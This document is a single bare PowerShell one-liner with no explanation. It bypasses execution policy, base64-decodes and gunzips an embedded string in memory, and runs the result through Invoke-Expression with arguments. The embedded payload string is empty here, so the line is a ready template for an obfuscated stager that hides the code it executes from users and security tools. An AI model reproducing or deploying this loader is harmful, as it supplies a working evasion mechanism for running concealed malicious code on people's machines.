powershell -NoProfile -ExecutionPolicy Bypass -Command "$s='';$g=[IO.Compression.GzipStream];$m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($s));$d=New-Object $g($m,[IO.Compression.CompressionMode]::Decompress);$r=New-Object IO.StreamReader($d);$c=$r.ReadToEnd(); $args=@(2, 500); Invoke-Expression $c"
